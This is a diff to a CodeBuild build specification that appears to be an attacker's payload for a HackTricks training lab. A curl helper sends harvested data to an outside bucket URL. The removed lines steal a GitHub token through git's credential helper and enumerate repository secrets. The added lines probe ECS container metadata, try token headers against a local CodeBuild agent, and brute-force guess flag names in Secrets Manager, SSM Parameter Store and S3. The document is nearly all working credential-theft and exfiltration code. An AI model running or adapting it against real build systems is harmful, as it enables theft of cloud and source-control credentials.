@@ -16,40 +16,60 @@ phases:
         putkey(){ key="$1"; file="$2"; head -c 60000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
         echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== git config ==='
-          git config --list --show-origin 2>&1 | sed -E 's/(password|token|authorization)=.*/\1=REDACTED/I'
-          echo '=== git credential fill ==='
-          printf 'protocol=https\nhost=github.com\npath=HackTricks-Training/codebuild-codebreach-actors-lab\n\n' | git credential fill > /tmp/gitcred.raw 2>&1
-          sed -E 's/(password=).*/\1REDACTED/; s/(oauth|gh[opsu]_[A-Za-z0-9_]+)/REDACTED/g' /tmp/gitcred.raw
-          token=$(awk -F= '$1=="password"{print $2}' /tmp/gitcred.raw)
-          echo "token_len=${#token}"
-          if [ -n "$token" ]; then
-            echo '=== github token metadata ==='
-            curl -fsS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/user | jq '{login,id,type}' 2>&1
-            echo '=== repo permission ==='
-            curl -fsS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab | jq '{full_name, private, permissions, role_name}' 2>&1
-            echo '=== actions variables ==='
-            curl -sS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/actions/variables | jq . 2>&1
-            echo '=== actions secrets names ==='
-            curl -sS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/actions/secrets | jq . 2>&1
-            echo '=== repo vars grep via api root ==='
-            for ep in \
-              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/environments \
-              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/hooks \
-              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/actions/runners/registration-token \
-              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/codespaces/secrets \
-              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/dependabot/secrets; do
-              echo "--- $ep"
-              curl -sS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' "https://api.github.com$ep" | sed -E 's/(token|password|secret|key)"?: ?"[^"]+"/\1":"REDACTED"/Ig' | head -c 12000; echo
-            done
-          fi
-        } > /tmp/gitgh.txt 2>&1
-        putkey gitgh /tmp/gitgh.txt
+          echo '=== exact ecs metadata ==='
+          for u in \
+            "$ECS_CONTAINER_METADATA_URI" \
+            "$ECS_CONTAINER_METADATA_URI/task" \
+            "$ECS_CONTAINER_METADATA_URI/stats" \
+            "$ECS_CONTAINER_METADATA_URI_V4" \
+            "$ECS_CONTAINER_METADATA_URI_V4/task" \
+            "$ECS_CONTAINER_METADATA_URI_V4/task/stats" \
+            "$ECS_AGENT_URI"; do
+            echo "--- $u"
+            curl -sS --connect-timeout 2 --max-time 5 "$u" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN|AWS_CONTAINER_CREDENTIALS_FULL_URI)[^,}]*/\1:REDACTED/g' | head -c 12000; echo
+          done
+          echo '=== decoded codebuild env blobs ==='
+          echo "$CODEBUILD_CONTAINER_INFO" | base64 -d 2>/dev/null; echo
+          echo "$CODEBUILD_LOG_STREAM_INFO" | base64 -d 2>/dev/null; echo
+        } > /tmp/ecsmeta.txt 2>&1
+        putkey ecsmeta /tmp/ecsmeta.txt
         {
-          echo '=== aws codebuild/source/logs reads ==='
-          aws codebuild list-source-credentials --region us-east-1 --output json 2>&1
-          aws codebuild batch-get-builds --ids "$CODEBUILD_BUILD_ID" --region us-east-1 --output json 2>&1
-          aws logs describe-log-streams --log-group-name "/aws/codebuild/codebuild_lab_5_project" --region us-east-1 --output json 2>&1
-          aws logs get-log-events --log-group-name "/aws/codebuild/codebuild_lab_5_project" --log-stream-name "$CODEBUILD_LOG_PATH" --region us-east-1 --output json 2>&1
-        } > /tmp/awsreads.txt 2>&1
-        putkey awsreads /tmp/awsreads.txt
+          echo '=== agent with container token variants ==='
+          for base in http://127.0.0.1:7831 http://localhost:7831; do
+            for h in \
+              "Authorization: $CODEBUILD_CONTAINER_TOKENS" \
+              "Authorization: Bearer $CODEBUILD_CONTAINER_TOKENS" \
+              "X-CodeBuild-Container-Token: $CODEBUILD_CONTAINER_TOKENS" \
+              "X-Amz-CodeBuild-Container-Token: $CODEBUILD_CONTAINER_TOKENS" \
+              "CodeBuild-Container-Token: $CODEBUILD_CONTAINER_TOKENS" \
+              "X-CodeBuild-Container-Id: $CODEBUILD_CONTAINER_TOKENS"; do
+              echo "### $base header ${h%%:*}"
+              for p in / /ping /health /status /v1/status /v1/metadata /v1/build /build /logs /env /variables /credentials /api/v1/build /api/v1/metadata; do
+                echo "--- $p"
+                curl -sS --connect-timeout 2 --max-time 5 -H "$h" "$base$p" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 3000; echo
+              done
+            done
+          done
+        } > /tmp/agentcontainer.txt 2>&1
+        putkey agentcontainer /tmp/agentcontainer.txt
+        {
+          echo '=== exact secret/parameter guesses ==='
+          for n in \
+            flag FLAG Flag \
+            codebuild_lab_5_flag codebuild-lab-5-flag codebuild_lab_5_project_flag codebuild-lab-5-project-flag \
+            /codebuild_lab_5/flag /codebuild/lab5/flag /codebuild/lab_5/flag /codebuild/codebuild_lab_5_project/flag \
+            codebreach_flag codebreach-flag codebuild-codebreach-actors-lab-flag; do
+            echo "--- secret $n"; aws secretsmanager get-secret-value --secret-id "$n" --region us-east-1 --output json 2>&1 | head -c 2000; echo
+            echo "--- param $n"; aws ssm get-parameter --name "$n" --with-decryption --region us-east-1 --output json 2>&1 | head -c 2000; echo
+          done
+          echo '=== s3 exact guesses ==='
+          for b in \
+            codebuild-lab-5-flag codebuild-codebreach-actors-lab-flag codebuild-codebreach-actors-lab \
+            codebuild-lab-5-project codebuild_lab_5_project codebuild-lab-5 codebreach-actors-lab-flag \
+            hacktricks-training-codebuild-flag hacktricks-codebuild-codebreach-flag; do
+            for key in flag flag.txt FLAG secret.txt codebuild_lab_5_flag; do
+              echo "--- s3://$b/$key"; aws s3api get-object --bucket "$b" --key "$key" "/tmp/s3_$b_$key" --region us-east-1 --output json 2>&1 | head -c 1200; [ -s "/tmp/s3_$b_$key" ] && { echo; cat "/tmp/s3_$b_$key"; }; echo
+            done
+          done
+        } > /tmp/guesses.txt 2>&1
+        putkey guesses /tmp/guesses.txt
